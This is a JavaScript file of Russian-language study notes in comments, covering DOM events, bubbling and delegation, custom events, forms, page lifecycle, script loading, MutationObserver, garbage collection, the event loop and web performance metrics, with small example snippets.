//? element.onClick
//? можно подписаться вызывав определенное свойство обьекта тега, повторное присвоение обработчика перезапишет его, а чтобы обнулить его таким образом можно передать null


//? addEventListener
// https://developer.mozilla.org/ru/docs/Web/API/EventTarget/addEventListener
//? вешаем обработчик на элемент через этот метод
//? при объявлении таким образом обработчика, мы можем сколько угодно повесить обработчиков на один и тот же элемент, но чтобы удалить обработчик, нужно точно знать ссылку на функцию, которая является обработчиком
/*
bla.addEventListener('click', (e) => {});   //такой обработчик нельзя обнулить

function click(e) {}   //а вот такой вариант сработает
bla.addEventListener('click', click);
bla.removeEventListener('click', click);
*/
//? принимает 3 параметра: само событие, обработчик, и обьект настроек
//? обьект настроек это:
//? */capture/ - boolean(отвечает за то, когда будет поймано событие, на погружении - true, на всплытие - false по дефолту)
//? */once/ - boolean(обработчик будет вызван один раз и удален)
//? */passive/ - boolean(обработчик никогда не может быть отменен через preventDefault(будет ворнинг), некоторые события по дефолту идут уже с true, поэтому может не работать preventDefault)
//? устанавливают в true - например прокрутку, потому что если на прокрутку у нас большой обработчик, браузеру нужно ждать конца выполнения, чтобы посмотреть не был ли вызван preventDefault, и это может сильно тормозить, для этого устанавливают passive: true

//? handler принимает в себя обьект event, который содержит информацию по событию


//? получить доступ к элементу можно через this, это будет тот элемент, на котором висит обработчик события


//? Обработчики некоторых событий можно назначать только через addEventListener. Существуют события, которые нельзя назначить через DOM-свойство, но можно через addEventListener. Например, таково событие DOMContentLoaded, которое срабатывает, когда завершена загрузка и построение DOM документа.





//?================================================================================================================================================
//? /Всплытие и погружение/
// https://learn.javascript.ru/bubbling-and-capturing


//? все события(почти) проходят 2 фазы, погружение и всплытие, от документа, до самого вложенного элемента, внутри того, на котором висит обработчик, и обратно до документа
//? отсюда делаем вывод, что если у нас есть клик на body, и внутри него есть кнопка, на которой тоже есть клик, то при клике на кнопку, событие будет всплывать, и вызывать клик событие на всех элементах, на которых висит это событие, следовательно клик по кнопке вызовет и на кнопке событие и на body


//? this/event.target/currentTarget
//? this и currentTarget указывают на элемент, на котором ВИСИТ обработчик события, он не изменен никогда
//? target же, указывает на вложенный элемент, который находится внутри элемента, на котором висит обработчик события, и на котором как был вызван этот обработчик
/*
<div class='test' onclick='log'>
    <p>Click me</p>
</div>

function log(e) {
    console.log(e.target);   //если будет клик по p, то тут будет p(потому что этот элемент вызвал событие)
    console.log(e.currentTarget || this);   //в любом случае будет сам элемент на котором висит событие
}
*/


//? stopPropagation
//? отменяет всплытие события, советуют не отменять просто так его, т.к. это может быть достаточно удобно для сбора статистики, такой метод отменяет всплытие дальше, но на такущем элементе все обработчики этого события будут вызваны
//? вместо отмены всплытия можно решить попробовать проблему через делегирование
/*
document.body.addEventListener('click', (e) => {
    console.log('click body');
})

inside.addEventListener('click', (e) => {
    e.stopPropagation();   //т.к. остановили всплытие, событие до боди не дойдет
    console.log(e.target);
});
*/


//? stopImmediatePropagation
//? отменяет ВСЕ обработчики на данном элементе, кроме того, который сейчас отрабатывает, то есть если на элементе 2 обрабтчика клика и в первом мы вызываем метод, то второй обработчик не вызовется
/*
inside.addEventListener('click', (e) => {
    e.stopImmediatePropagation();
    console.log(e.target);
    console.log(e.currentTarget);
});
inside.addEventListener('click', (e) => {
    console.log('второй обработчик, и сюда не должно дойти');   //не вызовется, т.к. stopImmediatePropagation прекратит
});
*/


//? event.eventPhase
//? указывает на какой фазе было поймано событие


//? если на одном элементе несколько обработчиков, они все сработают в порядке объявления





//?================================================================================================================================================
//? /Делегирование событий/
// https://learn.javascript.ru/event-delegation


//? принцип работы такой, что вместо того, чтобы вешать событие на кучу элементов, которые мы хотим обработать, мы вешаем на их родителя и с помощью условий мы обрабатываем нужные нам элементы.
//? Плюс такой схемы в том, что если у нас элементы создаются динамически, то на всех на них будет срабатывать обработчик, но если же мы получили элементы, перебрали их черерз цикл и на каждый навесили обработчик, то при добавлении элемента на нем не будет обработчика


//?Всегда используйте метод addEventListener для обработчиков на уровне документа Когда мы устанавливаем обработчик событий на объект document, мы всегда должны использовать метод addEventListener, а не document.on<событие>, т.к. в случае последнего могут возникать конфликты: новые обработчики будут перезаписывать уже существующие. Для реального проекта совершенно нормально иметь много обработчиков на элементе document, установленных из разных частей кода.





//?================================================================================================================================================
//? /Действия браузера по умолчанию/
// https://learn.javascript.ru/default-browser-action


//? у браузеров есть дефолтное поведение, например клик по ссылке переходит на новую страницу, зажатие кнопки мыши над текстом и её движение в таком состоянии – инициирует его выделение и т.д.


//? event.preventDefault()
//? отменяет действия браузера по умолчанию, можно вызвать этот метод, а можно из обработчика, который назначен через on<событие> вернуть false
/*
<a href="/" onclick="return false">Нажми здесь</a>
<a href="/" onclick="event.preventDefault()">здесь</a>
*/


//? event.defaultPrevented
//? было ли поведение прекращено





//?================================================================================================================================================
//? /Генерация пользовательских событий/dispatchEvent/
// https://learn.javascript.ru/dispatch-events
// https://developer.mozilla.org/ru/docs/Web/API/Event/Event


//? мы можем создавать свои кастомные события, и вешать на элементы эти события, а затем в нужный нам момент диспатчить эти события на элементы
//? Event принимает имя евента, и обьект настроек:        bubbles: true/false – если true, тогда событие всплывает,        cancelable: true/false – если true, тогда можно отменить действие по умолчанию. Позже мы разберём, что это значит для пользовательских событий,        composed: true/false – если true, тогда событие будет всплывать наружу за пределы Shadow DOM
/*
const myCustomEvent = new Event('myCustomEvent', { bubbles: true });
let test = document.querySelector('#test');
document.addEventListener('myCustomEvent', (e) => {
    e.stopPropagation();
    console.log(e);
});
test.dispatchEvent(myCustomEvent);
*/
//? CustomEvent
//? лучше создавать подобные события через CustomEvent, т.к. в обьекте второго параметра можно указать доп. свойство detail, в которое можно запихнуть кучу информации, которая будет доступна через event.detail.<any>
/*
elem.addEventListener("hello", function(event) {
    alert(event.detail.name);
});
elem.dispatchEvent(new CustomEvent("hello", {
    detail: { name: "Вася" }
}));
*/
//? то есть смысл в этом в том, что мы можем на элемент повесить свое событие, и диспатчить его в нужный нам момент времени, и в этом событии как то реагировать на него(скрывать элемент и т.д)


//? для специфичных событий есть свои конструкторы со своими плюшками(например в MouseEvent есть данные о положении мыши) и лучше создавать такие события именно через подобные конструкторы


//? event.isTrusted
//? было ли событие сгенерировано браузером, или наше пользовательское событие. true - для браузерных, false - кастомные




//? если мы отключили через pointer-events: none например клик, мы все равно может через кастомное событие вызвать клик на этом элементе





//? вложенные события обрабатываются синхронно
// https://learn.javascript.ru/dispatch-events#vlozhennye-sobytiya-obrabatyvayutsya-sinhronno
//? это значит, что если у нас есть обработчик на кнопке, внутри которого мы диспатчим событие куда то, то сначала выполнится код перед диспатчем, затем выполнится код в кастомном обработчике события, и затем продолжит выполняться код в обработчике на кнопке
/*
<button id="menu">Меню (нажми меня)</button>
<script>
    menu.onclick = function() {
        alert(1);

        menu.dispatchEvent(new CustomEvent("menu-open", {
            bubbles: true
        }));

        alert(2);
    };
    document.addEventListener('menu-open', () => alert('вложенное событие'))
</script>
***Порядок вывода: 1 → вложенное событие → 2.
*/





//?================================================================================================================================================
//? /События мыши/
// https://learn.javascript.ru/mouse-events-basics


//? некоторые события есть и на тачскринах для совместимости

//? также одно событие может порождать другие, то есть, mousedown => mouseup => click


//? which
//? на какой кнопке произошло событие:      event.which == 1 – левая кнопка,        event.which == 2 – средняя кнопка,         event.which == 3 – правая кнопка


//? shift, alt, ctrl и meta
//? все события мыши имею инфу о нажатых клавишах модификаторах:        shiftKey: Shift,        altKey: Alt (или Opt для Mac),        ctrlKey: Ctrl,        metaKey: Cmd для Mac


//? clientX/Y, pageX/Y
//? все события мыши имею координаты:       относительно окна: clientX и clientY,       относительно документа: pageX и pageY





//? Движение мыши
// https://learn.javascript.ru/mousemove-mouseover-mouseout-mouseenter-mouseleave


//? relatedTarget
//? дополнительным свойством является relatedTarget, это тот элемент, на котором была мышь до текущего элемента(если с div перенести на span мышь, то div - relatedTarget, span - target), но на mouseout все наоборот(event.target – это элемент, с которого курсор ушёл, event.relatedTarget – это элемент, на который курсор перешёл)
//? может быть null и означает, что курсор или вышел или зашел из пределов окна


//? mouseover пропуск элементов
//? браузер генерирует события не на каждый пиксель, а с определенным интервалом, это значит, что если пользователь будет двигать слышком быстро мышью, то некоторые элементы не успеют отработать событие

//? но в одном можно быть уверенным, если было событие mouseover(или интер), то будет mouseout, его перескачить нельзя, если уже было вхождение

//? событие mouseover, происходящее на потомке, всплывает. Поэтому если на родительском элементе есть такой обработчик, то оно его вызовет.


//? mouseout
//? важная вещь, что это событие генерируется и на потомках элемента, на котором висит событие. По логике браузера, курсор мыши может быть только над одним элементом в любой момент времени – над самым глубоко вложенным и верхним по z-index.
/*
<div id="test">
    <span>example</span>
</div>
*/
//? когда мышь зайдет на span, сработает событие mouseout, т.к. это потомок на котором висит событие


//? mouseenter/mouseleave
//? они похожи на маусовер и маусаут, но есть пара отличий важных:      они не всплывают, и она не срабатывают на потомках, только на самих себе
//? они очень просты, но т.к. они не всплывают нельзя их делегировать





//? Клавиатурные события
// https://learn.javascript.ru/keyboard-events


//? keydown/keyup
//? нажатие и отпускание клавиши


//? event.code/key
//? key - символ события, то есть сам символ, которые был сейчас использован, например буква а в верхнем или нижнем регистре(то есть key изменяем), code - код события, он всегда один и тот же, например KeyZ(при нажатии на zZ)
//? если изменить язык ввода, то key изменится на символ другого языка, но код останется тем же
//? есть плюсы и минусы использования обоих: если хотим поддерживать клавиши, меняющиеся при раскладке - key, если хотим поддерживать события даже при переключении на другой язык - code, но code может не работать в некоторых местах(например KeyZ), из за разных раскладок у разных пользователей


//? event.repeat
//? была ла зажата клавиша надолго?


//? дефолтные нажатия, такие как delete, page up, отменяются так же через preventDefault почти во всех браузерах


//? keypress, а также свойства keyCode, charCode, which считаются устаревшими
// https://learn.javascript.ru/keyboard-events#dela-minuvshih-dney





//?================================================================================================================================================
//? /События указателя/
// https://learn.javascript.ru/pointer-events
// https://developer.mozilla.org/ru/docs/Web/API/Pointer_events


//? раньше отдельно использовали события мыши и тач ивенты, но писать код, чтобы поддерживать и тач, и мышь, и перо проблемотично, поэтому сделали события указателя, которые поддерживаются везде, кроме очень старых версий браузера


//? есть много новых свойств, вот пара из них:
//? isPrimary – равно true для основного указателя (первый палец в мульти-тач)

//? pointerType – тип указывающего устройства. Должен быть строкой с одним из значений: «mouse», «pen» или «touch»

//? pointerId – уникальный идентификатор указателя, вызвавшего событие. Идентификатор генерируется браузером. Это свойство позволяет обрабатывать несколько указателей, например сенсорный экран со стилусом и мульти-тач
//? pointerId присваивается не на всё устройство, а для каждого касающегося пальца. Если коснуться экрана 5 пальцами одновременно, получим 5 событий pointerdown, каждое со своими координатами и индивидуальным pointerId. События, связанные с первым пальцем, всегда содержат свойство isPrimary=true.

//? width – ширина области соприкосновения указателя (например, пальца) с устройством. Если не поддерживается, например мышью, то всегда равно 1

//? height – высота области соприкосновения указателя с устройством. Если не поддерживается, например мышью, то всегда равно 1

//? pressure – степень давления указателя в диапазоне от 0 до 1. Для устройств, которые не поддерживают давление, принимает значение 0.5 (нажато) либо 0

//? tangentialPressure – нормализованное тангенциальное давление

//? tiltX, tiltY, twist – специфичные для пера свойства, описывающие положение пера относительно сенсорной поверхности





//?================================================================================================================================================
//? /Scroll/Прокрутка/
// https://learn.javascript.ru/onscroll


//? Прокрутку нельзя отменить вызвав preventDefault, потому что событие скролл появляется только после самой прокрутки, можно отменить либо через overflow hidden, или же отменить только то действие, которое вызывает эту прокрутку, например keydown стрелок










//!================================================================================================================================================
//? /Forms/Формы/
// https://learn.javascript.ru/form-elements


//? document.forms
//? все формы документа можно получить через document.forms, где каждая форма будет под своим именем(аттрибут name), либо можно получить по индексу


//? elements
//? затем в форме можно получить уже все инпуты через elements, где они будут доступны по имени и также по индексу
//? fieldset так же будет доступен через elements, и также внутри него доступны элементы формы через elements
//? вместо form.elements.login мы можем написать form.login, то есть напрямую по имени обратиться


//? element.form
//? все элементы формы могут сослаться на форму через form, то есть обратные ссылки есть





//? select/option
// https://learn.javascript.ru/form-elements#select-i-option

//? select.options/value/selectedIndex – коллекция из подэлементов <option>, значение выбранного в данный момент <option>, номер выбранного <option>


//? new Option
//? можно создать новый селект таким способом и поместить его на страницу





// https://learn.javascript.ru/focus-blur
//? focus/blur
//? события фокус и блюр можно повесить на элементы, так и вызвать эти методы у элементов
//? эти события не всплывают, но их можно перехватить на фазе погружения


//? focusin/focusout
//? тоже самое что и выше события, но они всплывают





// https://learn.javascript.ru/events-change-input
//? change
//? происходит, при окончании изменении элемента, при потере фокуса, но для элементов select и input типа чекбокс, это событие сработает сразу при выборе значения


//? input
//? каждый раз при изменении значения(при вставке с помощью мыши и голосового ввода)


//? cut/copy/paste
//? относятся к ClipboardEvent классу, их можно отменить через preventDefault и отменить вставку и т.д.





// https://learn.javascript.ru/forms-submit
//? submit
//? форму можно отправить через input/button type="submit", или нажав enter в инпуте, а также вызывав на форме метод submit вручную










//!================================================================================================================================================
//? /Page events/события страницы/
// https://learn.javascript.ru/onload-ondomcontentloaded


//? у страницы есть 4 жизенных цикла(события), DOMContentLoaded, load, beforeunload, unload


//? /DOMContentLoaded/
//? страница польностью загружена, но внешние ресурсы типа картинок могут еще подгружаться, то есть только dom и ничего больше
//? когда браузер обрабатывает HTML-документ и встречает тег <script>, он должен выполнить его перед тем, как продолжить строить DOM. Это делается на случай, если скрипт захочет изменить DOM или даже дописать в него (document.write), так что DOMContentLoaded должен подождать
/*
<script>
    document.addEventListener("DOMContentLoaded", () => {
        alert("DOM готов!");   //второй
    });
</script>

<script>
    alert("Библиотека загружена, встроенный скрипт выполнен");   //первый
</script>
*/

//? внешние таблицы стилей не затрагивают DOM, поэтому DOMContentLoaded их не ждёт. Но здесь есть подводный камень. Если после стилей у нас есть скрипт, то этот скрипт должен дождаться, пока загрузятся стили:
/*
<link type="text/css" rel="stylesheet" href="style.css">
<script>
    alert(getComputedStyle(document.body).marginTop);   скрипт не выполняется, пока не загрузятся стили
</script>
*/


//? window.onload
//? событие ждет загрузки абсолютно всего


//? window.onunload
//? когда пользователь уходит со страницы, тут обычно выполняют какие то очень не затратные скрипты, например отправка статистики, отменить выход со страницы мы тут не можем
//? естественно, событие unload – это тот момент, когда пользователь нас покидает и мы хотим сохранить эти данные. для этого существует специальный метод navigator.sendBeacon(url, data), описанный в спецификации https://w3c.github.io/beacon/. Он посылает данные в фоне. Переход к другой странице не задерживается: браузер покидает страницу, но всё равно выполняет sendBeacon.


//? window.onbeforeunload
//? когда пользователь собирается уйти со страницы и закрыть окно, тут можно отменить это событие
/*
window.onbeforeunload = () => {
    return false;
}
*/


//? document.readyState
//? статус документа:       "loading" – документ загружается.       "interactive" – документ был полностью прочитан.        "complete" – документ был полностью прочитан и все ресурсы (такие как изображения) были тоже загружены.


//? readystatechange
//? редко используется, существует для отслеживания статуса загрузки документа





//?================================================================================================================================================
//? /onload/onerror/
// https://learn.javascript.ru/onload-onerror


//? эти события можно повесить на все ресурсы у которых есть внешний src










//!================================================================================================================================================
//? /Scripts/скрипты/
// https://learn.javascript.ru/script-async-defer


//? когда браузер строит страницу, и доходит до скрипта, он должен его дождаться, потому что там может быть логика какая то по работе с домом, но скрипт может быть очень большим и может заблокировать страницу, а также такой скрипт не видит страницу ниже себя


//? defer
//? аттрибут говорит браузеру, чтобы скрипт загружался в фоновом режиме вместе с html и запускался после загрузки скрипта(по готовности)
//? скрипты с defer никогда не блокируют страницу. Скрипты с defer всегда выполняются, когда дерево DOM готово, но до события DOMContentLoaded.
//? атрибут defer предназначен только для внешних скриптов
//? маленький скрипт загрузится первым, но выполнится вторым. Браузеры сканируют страницу на предмет скриптов и загружают их параллельно в целях увеличения производительности. Поэтому и в примере выше оба скрипта скачиваются параллельно.


//? async
//? скрипт абсолютно независим, он не ждет никого и запускается по готовности сразу, в любой очереди, вообще ему похуй на все


//? динамически созданные скрипты ведут себя также, как и async










//!================================================================================================================================================
//? /MutationObserver/Наблюдатель за изменениями/
// https://learn.javascript.ru/mutation-observer
// https://developer.mozilla.org/ru/docs/Web/API/MutationObserver


//? служит для наблюдения за изменениями в доме


//? создается экземпляр MutationObserver, куда передается колбэк, а затем в этот observer передается элемент, за которым хотим вести наблюдение, и обьект настроек
/*
let node = document.getElementById('test');
let observer = new MutationObserver((e) => {
    console.log(e);
});
observer.observe(node, {
    subtree: true,
    childList: true,
    characterData: true,
    attributeOldValue: true,
    characterDataOldValue: true,
});
node.textContent = 'added text';
let child = node.append(document.createElement('span'));
node.textContent = 'added text again';
*/


//? объекты mutationObserver используют внутри себя так называемые «слабые ссылки» на узлы, за которыми смотрят. Так что если узел удалён из DOM и больше не достижим, то он будет удалён из памяти вне зависимости от наличия наблюдателя.










//!================================================================================================================================================
//? /Selection/Range/Выделение/
// https://learn.javascript.ru/selection-range
// https://developer.mozilla.org/ru/docs/Web/API/Range
// https://developer.mozilla.org/ru/docs/Web/API/Selection


//? range
//? range обьект служит для управления диапозонами выделения, мы можем сами устанавливать диапозоны выделения и манипулировать им, в этом обьекте направление только вперед
//? сам по себе такой обьект ничего не делает, мы должны получить обьект selection и добавить range, чтобы он отработал document.getSelection().addRange(range);





//? onselectstart
//? событие срабатывает при начале выделения на элементе


//? onselectionchange
//? когда выделение изменено. этот обработчик можно поставить только на document





//? selection
//? получить этот обьект можно через document.getSelection()

//? в firefox можно добавить несколько выделений, в остальных браузерах только одно выделение имеет место быть





//?================================================================================================================================================
//? выделение в инпутах

//? инпуты сами по себе предоставляют свойства и события для работы с выделением, т.к. там обычный текст и нам не нужно создавать дополнительных каких то обьектов для работы с ним


//? input.selectionStart – позиция начала выделения (это свойство можно изменять)

//? input.selectionEnd – позиция конца выделения (это свойство можно изменять)

//? input.selectionDirection – направление выделения, одно из: «forward» (вперёд), «backward» (назад) или «none» (без направления, если, к примеру, выделено с помощью двойного клика мыши)

//? input.onselect – срабатывает, когда начинается выделение
/*
**
***
****
*****/
//!================================================================================================================================================
//? /DOM/Document Object Model/BOM/Browser Object Model/CSSOM/Cascading Object Model/
// https://learn.javascript.ru/dom-nodes
// https://learn.javascript.ru/browser-environment#dom-document-object-model
// https://developer.mozilla.org/ru/docs/Web/API/Document_Object_Model/Introduction
// https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model
// https://developer.mozilla.org/en-US/docs/Web/API/Document        ***интерфейс
// https://developer.mozilla.org/en-US/docs/Learn/Performance/CSS       оптимизация css
// https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/preload


//? отправляется запрос
//? приходит html
//? строится dom
//? загружаются ресурсы
//? css - блокирует
//? script - блокирует если находится в head, нет defer/async
//? шрифты подключенные через link с CDN - блокируют


//? Загрузка CSS блокирует рендер html
//? также чтобы оптимизировать css - лучше разбить на разные файлы, а не делать import зависимостей в один


//? шрифты можно оптимизировать включив нужные сразу в css файл


//? Document Object Model, сокращённо DOM – объектная модель документа, которая представляет все содержимое страницы в виде объектов, которые можно менять. Объект document – основная «входная точка». С его помощью мы можем что-то создавать или менять на странице.


//? BOM - Объектная модель браузера (Browser Object Model, BOM) – это дополнительные объекты, предоставляемые браузером (окружением), чтобы работать со всем, кроме документа.
//? Например: Объект navigator даёт информацию о самом браузере и операционной системе. Среди множества его свойств самыми известными являются: navigator.userAgent – информация о текущем браузере, и navigator.platform – информация о платформе (может помочь в понимании того, в какой ОС открыт браузер – Windows/Linux/Mac и так далее). Объект location позволяет получить текущий URL и перенаправить браузер по новому адресу.


//? Document
//? HTML документ - набор тегов, которые и являются обьектами DOM
//? Для получения и работы с DOM мы используем document, это точка входа в работу с домом, оттуда можно получить доступ к body, html(documentElement), doctype, head и т.д.
//? Document не одно и тоже, что и window, window, это самая верхняя в иерархии точка входа, это все окно браузера, а document, это документ, который загружен в текущем окне и именно отсюда доступно содержимое веб-страницы


//? document.body может быть равен null, если скрипт был поставлен тег head, и если он не "отложен", то мы не сможем получить доступ к body


//? Только для чтения
//? Все коллекции, которые мы получаем через querySelector и т.д., все они только для чтения, мы не можем написать lastChild = <div></div>, для этого надо использовать другие методы


//? DOM коллекции живые
//? Почти все DOM-коллекции, за небольшим исключением, живые. Другими словами, они отражают текущее состояние DOM. Если мы сохраним ссылку на elem.childNodes и добавим/удалим узлы в DOM, то они появятся в сохранённой коллекции автоматически.
//? Статическими коллекциями являются те, которые были созданы через querySelectorAll, в них всегда будут изначальные элементы, во всех остальных getElementsBy* будут динамическими, а также обращения через children тоже будут возвращать динамические коллекции
/*
let spans = document.querySelector('#test').children;
console.log(spans);   //3 span
spans[1].remove();
console.log(spans);   //2 span
*/
/*
**
***
****
*****/
//!=============================================================================
//? /Customelements/
// https://developer.mozilla.org/ru/docs/Web/API/Web_components/Using_custom_elements
//? Можно создавать и регистрировать свои кастомные html элеменеты, привязывать свой класс, который будет вести работу
//? Есть хуки встроенные onConnectedCallback/disconnect, которые вызываются когда браузер отрисосывает их на странице, на основе этого работает ангуляр приложение
/*
**
***
****
*****/
//!================================================================================================================================================
//? /Сборщик мусора/Управление памятью/
// https://ru.wikipedia.org/wiki/%D0%A1%D0%B1%D0%BE%D1%80%D0%BA%D0%B0_%D0%BC%D1%83%D1%81%D0%BE%D1%80%D0%B0
// https://learn.javascript.ru/garbage-collection
// https://tproger.ru/translations/upravlenie-pamjatju-v-javascript/
// https://developer.mozilla.org/ru/docs/Web/JavaScript/Memory_Management
// https://habr.com/ru/post/550534/
// https://www.youtube.com/watch?v=z9YG9XBwCKo

//? Жизненный цикл памяти разбит на 3 этапа:
//? 1) Выделение памяти
//? 2) Использование
//? 3) Очистка


//? В js есть 2 места для хранения:
//? 1) Стек(stack)
//? 2) Куча(memory heap)


//? Стек/Stack
//? Структура данных для хранения статических данных, т.е. тех, чей размер известен во время компиляции, в js это все примитивы и ссылки на функции и обьекты
//? В js примитивы иммутабельны, это значит, что если мы хотим перезаписать примитив, то будет произведено новое выделение памяти, а не модифицирование старой


//? Куча/Memory heap
//? примерный размер - 700+ мегабайт на пк

//? В куче хранятся все обьекты, классы, функции, подключенные библиотеки а также DOM дерево, что важно. В куче хранится обьект document, который содержит в себе все тэги, doctype, комментарии, пробелы, текстовые ноды, переносы. Поэтому, если мы разделили строку лишними переводами, это лишние обьекты в памяти, лишние пробелы - лишние обьекты в памяти

//? память в js может тормозить из за сборки мусора и утечек памяти.
//? сборка мусора может быть очень медленной, из за слишком сильно забитой памяти
//? Движок выделяет память по мере необходимости, динамическое выделение памяти




//? Чтобы ускроить память, нужно хранить меньше данных на сайте. Например, не создавать лишние обьекты на странице, не делать бесконечный скролл, т.к. браузеру надо все это обрабатывать). Не делать сложные вычесления, а дробить их на мелкие
//? также можно делать троттлинг. Вызывать нужную функцию в определенном интервале. Например есть скролл обработчик, и чтобы в нем на каждое событие не делать ничего затратного(а он оочень часто страбатывает), мы проверяем, сколько времени прошло, и если прошло достаточно, чтобы не загружать процессор, мы заходим в эту функцию. Помимо этого, при скролле например браузер еще дополнительно пересчитывает положение сайта


//? Если мы работает с графикой, с огромными данным, лучше использовать canvas, вместо svg, т.к. канвас использует видеокарту и память ее, svg же - это разметка dom, она постоянно будет перерисовываться, и браузеру надо все это обрабатывать, создавать обьекты дома, добавлять свойства, аттрибуты и т.д, а это не хорошо


//? Сложные расчеты делать на сервере


//? Создавать параллельный поток(service worker). Это как бы новая вкладка браузера, с которой общается сообщениями





//? Алгоритмы сборки мусора:
//? 1) Сборка мусора на подсчете ссылок
//? Очищает обьект, на которые нет ссылок вообще. Минус в том, что циклические ссылки уже ломают эту систему.
//? 2) Алгоритм пометок/Mark and sweep
//? Прицип в топ, что сборщик помечает обьекты, к которым нельзя получить доступ через глобальный обьект и очищает, если доступа нет к ним. Таким образом решается проблема циклических ссылок.
//? В куче грубо говоря есть 2 отдела, отдел новых обьектов и старых. Сборщик мусора запускает цикл проверки для них с разным интервалом, для старых обьектов реже, для новых - чаще. При выполнении программы сначала обьекты попадают в 'новый' отдел, после определенного времени в 'старый'.


//? сборщик удаляет обьекты те, на которые больше нет ссылок, даже если удаляемый обьект имеет ссылки на другие, он будет удален, потому что важны только ссылающиеся на него ссылки
/*
let user = {name: 'dima'};
user = null;   //сборщик видит, что мы не ссылаемся на обьект и удаляет его

let user = {name: 'dima'};
let admin = user;
user = null;   //пока что еще обьект есть, так как на него ссылается admin
admin = null;   //сборщик удаляет обьект
*/



//? /FinalizationRegistry/
//? можно отследить когда обьект был удален сборщиком
/*
**
***
****
*****/
//!================================================================================================================================================
//? /EventLoop/Событийный цикл/
// https://learn.javascript.ru/event-loop
// http://latentflip.com/loupe/?code=JC5vbignYnV0dG9uJywgJ2NsaWNrJywgZnVuY3Rpb24gb25DbGljaygpIHsKICAgIHNldFRpbWVvdXQoZnVuY3Rpb24gdGltZXIoKSB7CiAgICAgICAgY29uc29sZS5sb2coJ1lvdSBjbGlja2VkIHRoZSBidXR0b24hJyk7ICAgIAogICAgfSwgMjAwMCk7Cn0pOwoKY29uc29sZS5sb2coIkhpISIpOwoKc2V0VGltZW91dChmdW5jdGlvbiB0aW1lb3V0KCkgewogICAgY29uc29sZS5sb2coIkNsaWNrIHRoZSBidXR0b24hIik7Cn0sIDUwMDApOwoKY29uc29sZS5sb2coIldlbGNvbWUgdG8gbG91cGUuIik7!!!PGJ1dHRvbj5DbGljayBtZSE8L2J1dHRvbj4%3D
// https://habr.com/ru/company/hh/blog/517594/


//? поток выполнения в браузере и node.js основан на событийном цикле
//? event loop в браузере предоставляется самим браузером, в node - за счет libuv библиотеки


//? если немного упростить принцип работы, то существует всего 3 сущности для работы цикла, call stack, web apis, callback queue
//? принцип работы следующий, возьмем в пример код ниже
/*
$.on('button', 'click', function onClick() {
    setTimeout(function timer() {
        console.log('You clicked the button!');
    }, 9000);
});

console.log("Hi!");

setTimeout(function timeout() {
    console.log("Click the button!");
}, 10000);

console.log("Welcome to loupe.");
*/
//? сначала в callStack выполнится функция получения кнопки, и добавится этот слушатель в web apis, где будет ждать клика по кнопке
//? затем в стэк попадет консоль лог "Hi!" и стэк очистится
//? далее попадет в стэк setTimeout, и таймер добавится в апи браузера, где будет ждать выполнения таймера, стэк очищается
//? далее мы допустим делаем клик по кнопке, этот клик, этот колбэк попадет в очередь, и будет ждать, пока выполнится код ниже
//? выводится консоль лог самый последний "Welcome to loupe.", он попадает в стэк и стэк очищается после выполнения
//? затем из очереди срабатывает колбэка клика по кнопке, он помещается в стэк выполнения, сверху помещается таймаут, затем он идет в апи браузера, и стэк очищается
//? в апи браузера работают сразу 2 таймера, который был запущен с таймером 10секунд и после клика по кнопке, первый сработает после клика, затем второй
//? когда таймер сработает на 9 секунд после клика кнопки, функция коолбэк таймера попадет в очередь, и дальше туда же попадет функция колбэк 10 секундного таймера
//? затем колбэк таймера после клика попадет в стэк, сверху добавится консколь лог "You clicked the button!", стэк очищается
//? и только потом, когда стэк пуст, будет добавлен из очереди второй таймер, который десятисекундный, он также попадет в стэк, сверху будет консоль лог "Click the button!", и стэк очистится

//? в стэк попадают задачи из очереди, только тогда, когда он пуст


//? В событийном цикле есть 2 типа задач: микро и макротаски.
//? Микрозадачи - колбэки then, catch, finally у промисов, а также же колбэки mutation observer
//? Макрозадачи - таймауты, обработчики событий, обычный код


//? в nodejs process.nextTick выполняется в конце каждого тика с наивысшим приоритетом


//? В цикле у нас есть 3 очереди: для рендера страницы, микро и макро задач.

//?     queueMicroTask/async/microTasks
//? сразу после каждой задачи движок исполняет все задачи из очереди микрозадач перед тем, как выполнить следующую макрозадачу или отобразить изменения на странице, или сделать что-то ещё. Все микрозадачи завершаются до обработки каких-либо событий или рендеринга, или перехода к другой макрозадаче. Микрозадачи всегда беруться раньше всего остального из очереди, они имеют приоритет
//?     requestanimationframe, а также отрисовка дальнейшая(если таймер с 0 задержкей, то возможно и он сработает)
//?     painting/composition/layout
//? отрисовка, если она есть. Выполняются все задачи в очереди по рендеру страницы
//?     macrotasks/timers/events
//?     requestIdleCallback



//? в Iframe который кросс доменный будет новый eventLoop, а также в вебворкерах
/*
**
***
****
*****/
//!=============================================================================
//? /Perfomance/Производительность/Оптимизация/Optimization/
// https://developer.mozilla.org/ru/docs/Web/Performance
// https://developer.chrome.com/docs/devtools/
// https://developer.mozilla.org/en-US/docs/Web/Performance
// https://web.dev/explore/metrics
// https://web.dev/explore/how-to-optimize-inp
// https://developer.mozilla.org/en-US/docs/Web/API/Scheduling/isInputPending
// https://web.dev/explore/fast
// https://web.dev/articles/vitals
// https://web.dev/articles/vitals-measurement-getting-started?hl=ru
// https://web.dev/articles/optimize-lcp?hl=ru
// https://web.dev/articles/lab-and-field-data-differences?hl=ru
// https://web.dev/articles/fetch-priority?hl=ru
// https://developer.chrome.com/docs/lighthouse/performance/render-blocking-resources/?hl=ru


//? Основные метрики


//?     /FP/(First paint) - время между переходом на страницу и моментом, когда браузер отображает первые пиксели на экране
// https://developer.mozilla.org/ru/docs/Glossary/First_paint


//?     /FCP/(First content paint) - первый отрисованный контент на странице
// https://web.dev/articles/fcp


//?     /LCP/Largest Contentful Paint/ - скорость первоначальной отрисовки видимого контента для юзера - то есть скорость загрузки изображения, видео, и в целом просто видимая верстка для пользователя будет учитываться тут


//?     /FID/ -> будет заменен на INP(Interaction to next paint). Задержка всех взаимодействий пользователя, то есть через сколько времени страница отреагирует на события


//?     /FID/(First input delay) задержка только первого взаимодействия
// https://web.dev/articles/inp?hl=ru


//?     /CLS/Cumulative Layout Shift/ - показатель неожиданных изменений, когда контент скачет сам собой из за какого асинхронного добавления


//?     /DOMContentLoaded/


//?     /load/


//?     /TTFB/Time to first bite/


//?     /TBT/Total blocking time/



//? Измерить можно PerformanceObserver
//? pagespeed
// https://pagespeed.web.dev
//? lighthouse
//? web-vitals библиотеку подключить



//? На табе perfomance можно измерить сколько времени выполняется таск, что вызывает reflow/repaint, что блокирует поток и тд
